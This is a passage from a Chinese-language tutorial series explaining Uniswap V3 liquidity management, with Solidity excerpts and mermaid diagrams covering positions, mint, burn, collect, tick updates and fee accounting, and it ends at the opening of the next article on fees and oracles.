待领取[待领取费用]\n    end\n\n    L --&gt; 流动性管理\n    FG0 --&gt; 费用追踪\n    FG1 --&gt; 费用追踪\n    TO0 --&gt; 待领取\n    TO1 --&gt; 待领取\n\n    style PosGroup fill:#e8f5e9\n\n2.2 Position的唯一标识\n/// @notice 获取头寸信息\nfunction get(\n    mapping(bytes32 =&gt; Info) storage self,\n    address owner,\n    int24 tickLower,\n    int24 tickUpper\n) internal view returns (Position.Info storage position) {\n    // 使用keccak256哈希三元组作为键\n    position = self[keccak256(abi.encodePacked(owner, tickLower, tickUpper))];\n}\nflowchart LR\n    subgraph InputGroup[&quot;输入&quot;]\n        O[owner地址]\n        TL[tickLower]\n        TU[tickUpper]\n    end\n\n    subgraph HashGroup[&quot;哈希计算&quot;]\n        PACK[&quot;abi.encodePacked(owner, tickLower, tickUpper)&quot;]\n        HASH[&quot;keccak256(...)&quot;]\n    end\n\n    subgraph StoreGroup[&quot;存储&quot;]\n        KEY[&quot;bytes32 key&quot;]\n        POS[&quot;positions[key]&quot;]\n    end\n\n    O --&gt; PACK\n    TL --&gt; PACK\n    TU --&gt; PACK\n    PACK --&gt; HASH\n    HASH --&gt; KEY\n    KEY --&gt; POS\n\n    style HashGroup fill:#fff3e0\n\n2.3 费用快照机制\nsequenceDiagram\n    participant LP as 流动性提供者\n    participant Pool as 池子合约\n    participant Position as Position结构\n\n    LP-&gt;&gt;Pool: mint(tickLower, tickUpper, amount)\n    Pool-&gt;&gt;Position: 记录当前feeGrowthInside\n    Note over Position: feeGrowthInside0LastX128 = 当前值\n\n    Note over Pool: ... 交易发生，费用累积 ...\n\n    LP-&gt;&gt;Pool: burn(tickLower, tickUpper, 0)\n    Pool-&gt;&gt;Position: 计算费用差值\n    Note over Position: 应得费用 = &lt;br/&gt;(当前feeGrowthInside - Last) × liquidity\n    Pool-&gt;&gt;Position: 更新tokensOwed\n    Pool--&gt;&gt;LP: 返回可领取金额\n\n\n3. mint函数：添加流动性\n3.1 函数签名与参数\nfunction mint(\n    address recipient,       // 头寸所有者\n    int24 tickLower,        // 价格区间下界\n    int24 tickUpper,        // 价格区间上界\n    uint128 amount,         // 流动性数量\n    bytes calldata data     // 回调数据\n) external override lock returns (\n    uint256 amount0,        // 需要的token0数量\n    uint256 amount1         // 需要的token1数量\n);\n3.2 完整执行流程\nflowchart TB\n    START[mint调用] --&gt; VALIDATE[参数验证]\n    VALIDATE --&gt; |amount &gt; 0| MODIFY[_modifyPosition]\n\n    subgraph _modifyPosition\n        MP1[检查tick有效性]\n        MP2[_updatePosition]\n        MP3[计算所需代币数量]\n    end\n\n    MODIFY --&gt; MP1 --&gt; MP2 --&gt; MP3\n\n    MP3 --&gt; CALC{当前价格位置?}\n\n    CALC --&gt;|P &lt; Pa| ONLY0[只需token0]\n    CALC --&gt;|Pa ≤ P ≤ Pb| BOTH[需要两种token]\n    CALC --&gt;|P &gt; Pb| ONLY1[只需token1]\n\n    ONLY0 &amp; BOTH &amp; ONLY1 --&gt; BALANCE[记录余额before]\n    BALANCE --&gt; CALLBACK[调用mint回调]\n    CALLBACK --&gt; VERIFY[验证余额增加]\n    VERIFY --&gt; EMIT[发出Mint事件]\n    EMIT --&gt; END[返回代币数量]\n\n    style _modifyPosition fill:#e3f2fd\n    style CALC fill:#fff3e0\n\n3.3 核心代码实现\nfunction mint(\n    address recipient,\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount,\n    bytes calldata data\n) external override lock returns (uint256 amount0, uint256 amount1) {\n    require(amount &gt; 0);\n \n    // 修改头寸并获取所需代币数量\n    (, int256 amount0Int, int256 amount1Int) = _modifyPosition(\n        ModifyPositionParams({\n            owner: recipient,\n            tickLower: tickLower,\n            tickUpper: tickUpper,\n            liquidityDelta: int256(amount).toInt128()\n        })\n    );\n \n    amount0 = uint256(amount0Int);\n    amount1 = uint256(amount1Int);\n \n    uint256 balance0Before;\n    uint256 balance1Before;\n \n    // 记录余额快照\n    if (amount0 &gt; 0) balance0Before = balance0();\n    if (amount1 &gt; 0) balance1Before = balance1();\n \n    // 调用回调函数，由调用者转入代币\n    IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(\n        amount0, amount1, data\n    );\n \n    // 验证代币已转入\n    if (amount0 &gt; 0) require(balance0Before.add(amount0) &lt;= balance0(), &#039;M0&#039;);\n    if (amount1 &gt; 0) require(balance1Before.add(amount1) &lt;= balance1(), &#039;M1&#039;);\n \n    emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);\n}\n\n4. _modifyPosition：核心位置修改\n4.1 功能概述\n_modifyPosition是流动性管理的核心函数，负责：\nflowchart TB\n    subgraph _modifyPosition职责\n        R1[验证tick参数]\n        R2[更新头寸信息]\n        R3[更新tick数据]\n        R4[管理tick位图]\n        R5[计算代币数量]\n    end\n\n    R1 --&gt; R2 --&gt; R3 --&gt; R4 --&gt; R5\n\n    style _modifyPosition职责 fill:#e8f5e9\n\n4.2 参数结构\nstruct ModifyPositionParams {\n    // 头寸所有者\n    address owner;\n    // 价格区间下界tick\n    int24 tickLower;\n    // 价格区间上界tick\n    int24 tickUpper;\n    // 流动性变化量（正=添加，负=移除）\n    int128 liquidityDelta;\n}\n4.3 完整代码实现\nfunction _modifyPosition(ModifyPositionParams memory params)\n    private\n    noDelegateCall\n    returns (\n        Position.Info storage position,\n        int256 amount0,\n        int256 amount1\n    )\n{\n    // 1. 验证tick参数\n    checkTicks(params.tickLower, params.tickUpper);\n \n    Slot0 memory _slot0 = slot0;\n \n    // 2. 更新头寸\n    position = _updatePosition(\n        params.owner,\n        params.tickLower,\n        params.tickUpper,\n        params.liquidityDelta,\n        _slot0.tick\n    );\n \n    // 3. 计算所需代币数量\n    if (params.liquidityDelta != 0) {\n        if (_slot0.tick &lt; params.tickLower) {\n            // 当前价格在区间下方：只需要token0\n            amount0 = SqrtPriceMath.getAmount0Delta(\n                TickMath.getSqrtRatioAtTick(params.tickLower),\n                TickMath.getSqrtRatioAtTick(params.tickUpper),\n                params.liquidityDelta\n            );\n        } else if (_slot0.tick &lt; params.tickUpper) {\n            // 当前价格在区间内：需要两种代币\n            amount0 = SqrtPriceMath.getAmount0Delta(\n                _slot0.sqrtPriceX96,\n                TickMath.getSqrtRatioAtTick(params.tickUpper),\n                params.liquidityDelta\n            );\n            amount1 = SqrtPriceMath.getAmount1Delta(\n                TickMath.getSqrtRatioAtTick(params.tickLower),\n                _slot0.sqrtPriceX96,\n                params.liquidityDelta\n            );\n \n            // 更新全局活跃流动性\n            liquidity = LiquidityMath.addDelta(liquidity, params.liquidityDelta);\n        } else {\n            // 当前价格在区间上方：只需要token1\n            amount1 = SqrtPriceMath.getAmount1Delta(\n                TickMath.getSqrtRatioAtTick(params.tickLower),\n                TickMath.getSqrtRatioAtTick(params.tickUpper),\n                params.liquidityDelta\n            );\n        }\n    }\n}\n4.4 三种价格位置的代币需求\nflowchart LR\n    subgraph LowerGroup[&quot;价格 &lt; tickLower&quot;]\n        A1[只需token0]\n        A2[&quot;amount0 = L × (1/√Pa - 1/√Pb)&quot;]\n        A3[&quot;amount1 = 0&quot;]\n        A1 --&gt; A2\n        A2 --&gt; A3\n    end\n\n    subgraph InsideGroup[&quot;tickLower ≤ 价格 &lt; tickUpper&quot;]\n        B1[需要两种token]\n        B2[&quot;amount0 = L × (1/√P - 1/√Pb)&quot;]\n        B3[&quot;amount1 = L × (√P - √Pa)&quot;]\n        B1 --&gt; B2\n        B2 --&gt; B3\n    end\n\n    subgraph UpperGroup[&quot;价格 ≥ tickUpper&quot;]\n        C1[只需token1]\n        C2[&quot;amount0 = 0&quot;]\n        C3[&quot;amount1 = L × (√Pb - √Pa)&quot;]\n        C1 --&gt; C2\n        C2 --&gt; C3\n    end\n\n    style LowerGroup fill:#e3f2fd\n    style InsideGroup fill:#fff3e0\n    style UpperGroup fill:#fce4ec\n\n\n5. _updatePosition：头寸更新机制\n5.1 更新流程\nflowchart TB\n    START[_updatePosition] --&gt; GET[获取现有头寸]\n    GET --&gt; READ[读取全局费用增长率]\n\n    READ --&gt; CHECK{liquidityDelta != 0?}\n\n    CHECK --&gt;|是| ORACLE[更新预言机观察值]\n    ORACLE --&gt; UPDATE_LOWER[更新tickLower的Tick信息]\n    UPDATE_LOWER --&gt; UPDATE_UPPER[更新tickUpper的Tick信息]\n    UPDATE_UPPER --&gt; FLIP_CHECK{tick状态翻转?}\n\n    FLIP_CHECK --&gt;|是| FLIP_BITMAP[更新TickBitmap]\n    FLIP_CHECK --&gt;|否| CALC_FEE[计算内部费用增长率]\n    FLIP_BITMAP --&gt; CALC_FEE\n\n    CHECK --&gt;|否| CALC_FEE\n\n    CALC_FEE --&gt; UPDATE_POS[更新Position信息]\n    UPDATE_POS --&gt; CLEANUP{liquidityDelta &lt; 0&lt;br/&gt;且tick已翻转?}\n\n    CLEANUP --&gt;|是| CLEAR[清理tick数据]\n    CLEANUP --&gt;|否| END[返回position]\n    CLEAR --&gt; END\n\n    style FLIP_CHECK fill:#fff3e0\n    style UPDATE_POS fill:#c8e6c9\n\n5.2 完整代码实现\nfunction _updatePosition(\n    address owner,\n    int24 tickLower,\n    int24 tickUpper,\n    int128 liquidityDelta,\n    int24 tick\n) private returns (Position.Info storage position) {\n    // 获取头寸引用\n    position = positions.get(owner, tickLower, tickUpper);\n \n    // 缓存全局费用增长率\n    uint256 _feeGrowthGlobal0X128 = feeGrowthGlobal0X128;\n    uint256 _feeGrowthGlobal1X128 = feeGrowthGlobal1X128;\n \n    bool flippedLower;\n    bool flippedUpper;\n \n    if (liquidityDelta != 0) {\n        uint32 time = _blockTimestamp();\n \n        // 获取预言机累积值\n        (int56 tickCumulative, uint160 secondsPerLiquidityCumulativeX128) =\n            observations.observeSingle(\n                time,\n                0,\n                slot0.tick,\n                slot0.observationIndex,\n                liquidity,\n                slot0.observationCardinality\n            );\n \n        // 更新下界tick\n        flippedLower = ticks.update(\n            tickLower,\n            tick,\n            liquidityDelta,\n            _feeGrowthGlobal0X128,\n            _feeGrowthGlobal1X128,\n            secondsPerLiquidityCumulativeX128,\n            tickCumulative,\n            time,\n            false,  // 下界\n            maxLiquidityPerTick\n        );\n \n        // 更新上界tick\n        flippedUpper = ticks.update(\n            tickUpper,\n            tick,\n            liquidityDelta,\n            _feeGrowthGlobal0X128,\n            _feeGrowthGlobal1X128,\n            secondsPerLiquidityCumulativeX128,\n            tickCumulative,\n            time,\n            true,   // 上界\n            maxLiquidityPerTick\n        );\n \n        // 更新位图\n        if (flippedLower) {\n            tickBitmap.flipTick(tickLower, tickSpacing);\n        }\n        if (flippedUpper) {\n            tickBitmap.flipTick(tickUpper, tickSpacing);\n        }\n    }\n \n    // 计算区间内的费用增长率\n    (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) =\n        ticks.getFeeGrowthInside(\n            tickLower,\n            tickUpper,\n            tick,\n            _feeGrowthGlobal0X128,\n            _feeGrowthGlobal1X128\n        );\n \n    // 更新头寸信息\n    position.update(liquidityDelta, feeGrowthInside0X128, feeGrowthInside1X128);\n \n    // 清理不再需要的tick数据\n    if (liquidityDelta &lt; 0) {\n        if (flippedLower) {\n            ticks.clear(tickLower);\n        }\n        if (flippedUpper) {\n            ticks.clear(tickUpper);\n        }\n    }\n}\n\n6. Tick更新机制\n6.1 Tick.update函数\nfunction update(\n    mapping(int24 =&gt; Tick.Info) storage self,\n    int24 tick,\n    int24 tickCurrent,\n    int128 liquidityDelta,\n    uint256 feeGrowthGlobal0X128,\n    uint256 feeGrowthGlobal1X128,\n    uint160 secondsPerLiquidityCumulativeX128,\n    int56 tickCumulative,\n    uint32 time,\n    bool upper,                    // true=上界，false=下界\n    uint128 maxLiquidity\n) internal returns (bool flipped) {\n    Tick.Info storage info = self[tick];\n \n    uint128 liquidityGrossBefore = info.liquidityGross;\n    uint128 liquidityGrossAfter = LiquidityMath.addDelta(\n        liquidityGrossBefore,\n        liquidityDelta\n    );\n \n    require(liquidityGrossAfter &lt;= maxLiquidity, &#039;LO&#039;);\n \n    // 判断是否翻转（从0变为非0，或从非0变为0）\n    flipped = (liquidityGrossAfter == 0) != (liquidityGrossBefore == 0);\n \n    if (liquidityGrossBefore == 0) {\n        // 首次初始化该tick\n        if (tick &lt;= tickCurrent) {\n            // 初始化outside值\n            info.feeGrowthOutside0X128 = feeGrowthGlobal0X128;\n            info.feeGrowthOutside1X128 = feeGrowthGlobal1X128;\n            info.secondsPerLiquidityOutsideX128 = secondsPerLiquidityCumulativeX128;\n            info.tickCumulativeOutside = tickCumulative;\n            info.secondsOutside = time;\n        }\n        info.initialized = true;\n    }\n \n    info.liquidityGross = liquidityGrossAfter;\n \n    // 更新liquidityNet\n    // 下界：正向添加（从左向右跨越时增加流动性）\n    // 上界：反向添加（从左向右跨越时减少流动性）\n    info.liquidityNet = upper\n        ? int256(info.liquidityNet).sub(liquidityDelta).toInt128()\n        : int256(info.liquidityNet).add(liquidityDelta).toInt128();\n}\n6.2 liquidityNet的符号约定\nflowchart TB\n    subgraph AddGroup[&quot;添加流动性示例&quot;]\n        ADD[添加区间[100, 200]&lt;br/&gt;流动性L=1000]\n    end\n\n    subgraph TickGroup[&quot;tick更新&quot;]\n        T100[&quot;tick 100 (下界)&lt;br/&gt;liquidityNet += 1000&quot;]\n        T200[&quot;tick 200 (上界)&lt;br/&gt;liquidityNet -= 1000&quot;]\n    end\n\n    subgraph PriceGroup[&quot;价格从左向右移动&quot;]\n        CROSS100[跨越tick 100&lt;br/&gt;活跃流动性 += 1000]\n        CROSS200[跨越tick 200&lt;br/&gt;活跃流动性 -= 1000]\n    end\n\n    ADD --&gt; T100\n    ADD --&gt; T200\n    T100 -.-&gt; CROSS100\n    T200 -.-&gt; CROSS200\n\n    style AddGroup fill:#e3f2fd\n    style PriceGroup fill:#c8e6c9\n\n6.3 Tick翻转与位图管理\nflowchart TD\n    subgraph tick翻转条件\n        C1[&quot;liquidityGross: 0 → 非0&lt;br/&gt;（首次有LP进入）&quot;]\n        C2[&quot;liquidityGross: 非0 → 0&lt;br/&gt;（最后LP离开）&quot;]\n    end\n\n    subgraph 位图操作\n        F1[flipTick翻转位]\n        F2[&quot;0→1: tick变为活跃&quot;]\n        F3[&quot;1→0: tick变为非活跃&quot;]\n    end\n\n    C1 --&gt; F1 --&gt; F2\n    C2 --&gt; F1 --&gt; F3\n\n    style tick翻转条件 fill:#fff3e0\n\n\n7. Position.update：费用结算\n7.1 费用计算原理\nflowchart TB\n    subgraph 费用增长率概念\n        G[全局费用增长率&lt;br/&gt;feeGrowthGlobalX128]\n        I[内部费用增长率&lt;br/&gt;feeGrowthInsideX128]\n        L[上次记录值&lt;br/&gt;feeGrowthInsideLastX128]\n    end\n\n    subgraph 计算公式\n        F[&quot;应得费用 = (Inside当前 - Inside上次) × liquidity&quot;]\n    end\n\n    G --&gt; I\n    I &amp; L --&gt; F\n\n    style 计算公式 fill:#c8e6c9\n\n7.2 完整实现\nfunction update(\n    Info storage self,\n    int128 liquidityDelta,\n    uint256 feeGrowthInside0X128,\n    uint256 feeGrowthInside1X128\n) internal {\n    Info memory _self = self;\n \n    uint128 liquidityNext;\n    if (liquidityDelta == 0) {\n        // 仅收取费用，需要有流动性\n        require(_self.liquidity &gt; 0, &#039;NP&#039;);\n        liquidityNext = _self.liquidity;\n    } else {\n        liquidityNext = LiquidityMath.addDelta(_self.liquidity, liquidityDelta);\n    }\n \n    // 计算应得费用\n    // 使用unchecked因为溢出是期望行为（环绕算术）\n    uint128 tokensOwed0 = uint128(\n        FullMath.mulDiv(\n            feeGrowthInside0X128 - _self.feeGrowthInside0LastX128,\n            _self.liquidity,\n            FixedPoint128.Q128\n        )\n    );\n    uint128 tokensOwed1 = uint128(\n        FullMath.mulDiv(\n            feeGrowthInside1X128 - _self.feeGrowthInside1LastX128,\n            _self.liquidity,\n            FixedPoint128.Q128\n        )\n    );\n \n    // 更新流动性\n    if (liquidityDelta != 0) self.liquidity = liquidityNext;\n \n    // 更新费用增长快照\n    self.feeGrowthInside0LastX128 = feeGrowthInside0X128;\n    self.feeGrowthInside1LastX128 = feeGrowthInside1X128;\n \n    // 累积待领取费用\n    if (tokensOwed0 &gt; 0 || tokensOwed1 &gt; 0) {\n        self.tokensOwed0 += tokensOwed0;\n        self.tokensOwed1 += tokensOwed1;\n    }\n}\n7.3 费用计算示例\nflowchart LR\n    subgraph InitGroup[&quot;初始状态&quot;]\n        S1[&quot;liquidity = 1000&quot;]\n        S2[&quot;feeGrowthInsideLast = 100&quot;]\n    end\n\n    subgraph CurrGroup[&quot;当前状态&quot;]\n        C1[&quot;feeGrowthInside = 150&quot;]\n    end\n\n    subgraph CalcGroup[&quot;计算&quot;]\n        CALC[&quot;tokensOwed = (150 - 100) × 1000 / 2^128&quot;]\n    end\n\n    subgraph ResultGroup[&quot;结果&quot;]\n        R[&quot;tokensOwed ≈ 50 (归一化后)&quot;]\n    end\n\n    S1 --&gt; CALC\n    S2 --&gt; CALC\n    C1 --&gt; CALC\n    CALC --&gt; R\n\n    style CalcGroup fill:#fff3e0\n\n\n8. burn函数：移除流动性\n8.1 函数签名\nfunction burn(\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount\n) external override lock returns (\n    uint256 amount0,\n    uint256 amount1\n);\n8.2 执行流程\nflowchart TB\n    START[burn调用] --&gt; MODIFY[_modifyPosition&lt;br/&gt;liquidityDelta为负]\n\n    MODIFY --&gt; UPDATE[更新头寸]\n    UPDATE --&gt; CALC[计算可取回代币]\n\n    CALC --&gt; ADD_OWED[累加到tokensOwed]\n    ADD_OWED --&gt; EMIT[发出Burn事件]\n    EMIT --&gt; END[返回代币数量]\n\n    NOTE[注意：burn不直接转账&lt;br/&gt;需要调用collect取回]\n\n    style NOTE fill:#ffcdd2\n\n8.3 代码实现\nfunction burn(\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount\n) external override lock returns (uint256 amount0, uint256 amount1) {\n    // 以负的liquidityDelta调用_modifyPosition\n    (Position.Info storage position, int256 amount0Int, int256 amount1Int) =\n        _modifyPosition(\n            ModifyPositionParams({\n                owner: msg.sender,\n                tickLower: tickLower,\n                tickUpper: tickUpper,\n                liquidityDelta: -int256(amount).toInt128()\n            })\n        );\n \n    // 转换为正数（burn返回的是应得的代币）\n    amount0 = uint256(-amount0Int);\n    amount1 = uint256(-amount1Int);\n \n    // 累加到待领取（position.update已经处理了费用）\n    if (amount0 &gt; 0 || amount1 &gt; 0) {\n        (position.tokensOwed0, position.tokensOwed1) = (\n            position.tokensOwed0 + uint128(amount0),\n            position.tokensOwed1 + uint128(amount1)\n        );\n    }\n \n    emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);\n}\n\n9. collect函数：领取代币\n9.1 函数签名\nfunction collect(\n    address recipient,\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount0Requested,\n    uint128 amount1Requested\n) external override lock returns (\n    uint128 amount0,\n    uint128 amount1\n);\n9.2 执行流程\nflowchart TB\n    START[collect调用] --&gt; GET[获取头寸]\n    GET --&gt; CALC0[计算实际可领取token0]\n    CALC0 --&gt; CALC1[计算实际可领取token1]\n\n    CALC1 --&gt; CHECK0{amount0 &gt; 0?}\n    CHECK0 --&gt;|是| UPDATE0[更新tokensOwed0]\n    CHECK0 --&gt;|否| CHECK1\n\n    UPDATE0 --&gt; TRANSFER0[转账token0]\n    TRANSFER0 --&gt; CHECK1{amount1 &gt; 0?}\n\n    CHECK1 --&gt;|是| UPDATE1[更新tokensOwed1]\n    CHECK1 --&gt;|否| EMIT\n\n    UPDATE1 --&gt; TRANSFER1[转账token1]\n    TRANSFER1 --&gt; EMIT[发出Collect事件]\n\n    EMIT --&gt; END[返回实际领取数量]\n\n    style CHECK0 fill:#fff3e0\n    style CHECK1 fill:#fff3e0\n\n9.3 代码实现\nfunction collect(\n    address recipient,\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount0Requested,\n    uint128 amount1Requested\n) external override lock returns (uint128 amount0, uint128 amount1) {\n    Position.Info storage position = positions.get(msg.sender, tickLower, tickUpper);\n \n    // 计算实际可领取数量（取请求和可用的最小值）\n    amount0 = amount0Requested &gt; position.tokensOwed0\n        ? position.tokensOwed0\n        : amount0Requested;\n    amount1 = amount1Requested &gt; position.tokensOwed1\n        ? position.tokensOwed1\n        : amount1Requested;\n \n    // 更新待领取余额\n    if (amount0 &gt; 0) {\n        position.tokensOwed0 -= amount0;\n        TransferHelper.safeTransfer(token0, recipient, amount0);\n    }\n    if (amount1 &gt; 0) {\n        position.tokensOwed1 -= amount1;\n        TransferHelper.safeTransfer(token1, recipient, amount1);\n    }\n \n    emit Collect(msg.sender, recipient, tickLower, tickUpper, amount0, amount1);\n}\n\n10. NonfungiblePositionManager：NFT封装\n10.1 架构关系\nflowchart TB\n    subgraph 用户层\n        USER[用户]\n    end\n\n    subgraph 外围合约\n        NPM[NonfungiblePositionManager&lt;br/&gt;ERC721]\n    end\n\n    subgraph 核心合约\n        POOL[UniswapV3Pool]\n    end\n\n    USER --&gt;|mint/burn NFT| NPM\n    NPM --&gt;|mint/burn 流动性| POOL\n\n    style 外围合约 fill:#e3f2fd\n    style 核心合约 fill:#fff3e0\n\n10.2 Position结构（NFT）\nstruct Position {\n    // 用于计算费用的临时变量\n    uint96 nonce;\n \n    // 允许操作此头寸的地址\n    address operator;\n \n    // 池子标识\n    address token0;\n    address token1;\n    uint24 fee;\n \n    // 价格区间\n    int24 tickLower;\n    int24 tickUpper;\n \n    // 流动性数量\n    uint128 liquidity;\n \n    // 费用增长快照\n    uint256 feeGrowthInside0LastX128;\n    uint256 feeGrowthInside1LastX128;\n \n    // 待领取费用\n    uint128 tokensOwed0;\n    uint128 tokensOwed1;\n}\n10.3 NFT铸造流程\nsequenceDiagram\n    participant User as 用户\n    participant NPM as PositionManager\n    participant Pool as Pool合约\n    participant NFT as ERC721\n\n    User-&gt;&gt;NPM: mint(params)\n    NPM-&gt;&gt;Pool: mint(tickLower, tickUpper, amount)\n    Pool--&gt;&gt;NPM: 回调uniswapV3MintCallback\n    NPM-&gt;&gt;Pool: 转入所需代币\n    Pool--&gt;&gt;NPM: 返回(amount0, amount1)\n    NPM-&gt;&gt;NFT: _mint(tokenId)\n    NFT--&gt;&gt;User: NFT头寸代币\n\n10.4 关键函数\n// 铸造新头寸\nfunction mint(MintParams calldata params)\n    external\n    payable\n    override\n    checkDeadline(params.deadline)\n    returns (\n        uint256 tokenId,\n        uint128 liquidity,\n        uint256 amount0,\n        uint256 amount1\n    );\n \n// 增加流动性\nfunction increaseLiquidity(IncreaseLiquidityParams calldata params)\n    external\n    payable\n    override\n    checkDeadline(params.deadline)\n    returns (\n        uint128 liquidity,\n        uint256 amount0,\n        uint256 amount1\n    );\n \n// 减少流动性\nfunction decreaseLiquidity(DecreaseLiquidityParams calldata params)\n    external\n    payable\n    override\n    isAuthorizedForToken(params.tokenId)\n    checkDeadline(params.deadline)\n    returns (uint256 amount0, uint256 amount1);\n \n// 收取费用\nfunction collect(CollectParams calldata params)\n    external\n    payable\n    override\n    isAuthorizedForToken(params.tokenId)\n    returns (uint256 amount0, uint256 amount1);\n\n11. 流动性数学计算\n11.1 流动性与代币数量的关系\ngraph TB\n    subgraph 核心公式\n        F1[&quot;token0数量变化：&lt;br/&gt;Δx = L × (1/√Pa - 1/√Pb)&quot;]\n        F2[&quot;token1数量变化：&lt;br/&gt;Δy = L × (√Pb - √Pa)&quot;]\n    end\n\n    subgraph 等价形式\n        E1[&quot;Δx = L × (√Pb - √Pa) / (√Pa × √Pb)&quot;]\n        E2[&quot;L = Δy / (√Pb - √Pa)&quot;]\n        E3[&quot;L = Δx × √Pa × √Pb / (√Pb - √Pa)&quot;]\n    end\n\n    F1 --&gt; E1\n    F2 --&gt; E2 &amp; E3\n\n    style 核心公式 fill:#e8f5e9\n\n11.2 SqrtPriceMath实现\n/// @notice 计算价格变化所需的token0数量\nfunction getAmount0Delta(\n    uint160 sqrtRatioAX96,\n    uint160 sqrtRatioBX96,\n    uint128 liquidity,\n    bool roundUp\n) internal pure returns (uint256 amount0) {\n    // 确保 sqrtRatioA &lt; sqrtRatioB\n    if (sqrtRatioAX96 &gt; sqrtRatioBX96)\n        (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);\n \n    // amount0 = L × (√Pb - √Pa) / (√Pa × √Pb)\n    // = L × (sqrtRatioB - sqrtRatioA) / (sqrtRatioA × sqrtRatioB / 2^96)\n    uint256 numerator1 = uint256(liquidity) &lt;&lt; FixedPoint96.RESOLUTION;\n    uint256 numerator2 = sqrtRatioBX96 - sqrtRatioAX96;\n \n    require(sqrtRatioAX96 &gt; 0);\n \n    return roundUp\n        ? UnsafeMath.divRoundingUp(\n            FullMath.mulDivRoundingUp(numerator1, numerator2, sqrtRatioBX96),\n            sqrtRatioAX96\n        )\n        : FullMath.mulDiv(numerator1, numerator2, sqrtRatioBX96) / sqrtRatioAX96;\n}\n \n/// @notice 计算价格变化所需的token1数量\nfunction getAmount1Delta(\n    uint160 sqrtRatioAX96,\n    uint160 sqrtRatioBX96,\n    uint128 liquidity,\n    bool roundUp\n) internal pure returns (uint256 amount1) {\n    // 确保 sqrtRatioA &lt; sqrtRatioB\n    if (sqrtRatioAX96 &gt; sqrtRatioBX96)\n        (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);\n \n    // amount1 = L × (√Pb - √Pa)\n    return roundUp\n        ? FullMath.mulDivRoundingUp(\n            liquidity,\n            sqrtRatioBX96 - sqrtRatioAX96,\n            FixedPoint96.Q96\n        )\n        : FullMath.mulDiv(\n            liquidity,\n            sqrtRatioBX96 - sqrtRatioAX96,\n            FixedPoint96.Q96\n        );\n}\n\n12. 本章小结\n12.1 核心概念回顾\nmindmap\n  root((流动性管理))\n    Position\n      唯一标识三元组\n      流动性数量\n      费用快照机制\n      待领取费用\n    mint操作\n      参数验证\n      _modifyPosition\n      代币需求计算\n      回调验证\n    burn操作\n      负liquidityDelta\n      费用结算\n      累加tokensOwed\n    collect操作\n      领取待结算代币\n      支持部分领取\n    NFT封装\n      NonfungiblePositionManager\n      ERC721标准\n      头寸管理\n\n12.2 关键设计要点\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n设计要点实现方式效果非同质化Position三元组每个头寸独特可追踪费用跟踪增长率快照O(1)费用计算安全转账回调+余额验证防止代币丢失NFT封装PositionManager用户友好的接口Tick管理位图+翻转检测高效状态管理\n12.3 操作流程对比\nflowchart LR\n    subgraph AddLiqGroup[&quot;添加流动性&quot;]\n        A1[mint]\n        A2[_modifyPosition]\n        A3[回调转入代币]\n        A1 --&gt; A2\n        A2 --&gt; A3\n    end\n\n    subgraph RemoveLiqGroup[&quot;移除流动性&quot;]\n        B1[burn]\n        B2[_modifyPosition]\n        B3[累加tokensOwed]\n        B4[collect取回]\n        B1 --&gt; B2\n        B2 --&gt; B3\n        B3 --&gt; B4\n    end\n\n    subgraph CollectOnlyGroup[&quot;仅收费用&quot;]\n        C1[burn amount=0]\n        C2[结算费用]\n        C3[collect取回]\n        C1 --&gt; C2\n        C2 --&gt; C3\n    end\n\n    style AddLiqGroup fill:#c8e6c9\n    style RemoveLiqGroup fill:#ffcdd2\n    style CollectOnlyGroup fill:#fff3e0\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨费用系统与预言机，包括：\n\n费用增长率的完整计算机制\n协议费用的分配与提取\nTWAP预言机的实现原理\n观察者数组的管理与扩容\n\n\n参考资料\n\nUniswap V3 Core - UniswapV3Pool.sol\nUniswap V3 Core - Position.sol\nUniswap V3 Periphery - NonfungiblePositionManager.sol\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/06-费用系统与预言机":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/06-费用系统与预言机","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/06-费用系统与预言机.md","title":"06-费用系统与预言机","links":[],"tags":[],"content":"死磕Uniswap V3（六）：费用系统与预言机\n\n本文是「死磕Uniswap V3」系列的第六篇，深入剖析V3的费用分配机制和TWAP预言机系统的完整实现。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01概述与集中流动性AMM演进、集中流动性原理02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07MEV与套利策略JIT、三明治攻击\n\n1. 费用系统概述\n1.1 V3费用架构\nflowchart TB\n    subgraph 费用来源\n        SWAP[交易费用]\n    end\n\n    subgraph 费用分配\n        LP[LP费用]\n        PROTOCOL[协议费用]\n    end\n\n    subgraph LP费用分配\n        ACTIVE[活跃流动性LP]\n        INACTIVE[非活跃LP]\n    end\n\n    SWAP --&gt; LP\n    SWAP --&gt; PROTOCOL\n    LP --&gt; ACTIVE\n    LP -.-&gt;|不分配| INACTIVE\n\n    NOTE[只有当前价格区间内的&lt;br/&gt;活跃LP才能获得费用]\n\n    style NOTE fill:#fff3e0\n    style ACTIVE fill:#c8e6c9\n    style INACTIVE fill:#ffcdd2\n\n1.2 